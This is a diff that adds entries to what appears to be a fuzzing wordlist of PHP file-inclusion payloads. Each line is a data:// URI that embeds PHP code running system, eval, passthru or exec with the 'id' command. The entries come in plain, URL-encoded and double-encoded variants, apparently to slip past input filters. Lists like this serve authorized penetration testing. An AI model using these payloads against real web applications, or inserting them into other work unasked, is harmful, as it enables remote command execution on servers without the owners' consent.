@@ -17,5 +17,26 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
 data:text/plain,<?php%20system('id');%20?>
 data:text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
 data%3Atext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
+data://text/plain,<?php%20system('id');%20?>
+data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
+data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
 data://text/plain,<?php%20eval(\"system('id');\");%20?>
+data://text/plain,%3C?php%2520eval(%22system('id');%22);%2520?%3E
+data://text/plain,%3C%3Fphp%2520eval%28%22system%28%27id%27%29%3B%22%29%3B%2520%3F%3E
+
+
+data://text/plain,<?php%20passthru('id');%20?>
+data://text/plain,%3C?php%20passthru('id');%20?%3E
+data://text/plain,%3C?php%2520passthru('id');%2520?%3E
+data://text/plain,%3C%3Fphp%2520passthru%28%27id%27%29%3B%2520%3F%3E
+
+data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%20passthru%28%27id%27%29%3B%20%3F%3E
+data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%2520passthru%28%27id%27%29%3B%2520%3F%3E
+data%3A%2F%2Ftext%2Fplain%2C%253C%253Fphp%252520passthru%2528%2527id%2527%2529%253B%252520%253F%253E
+
+
+
+data://text/plain,<?php%20exec('id');%20?>
+
+
 
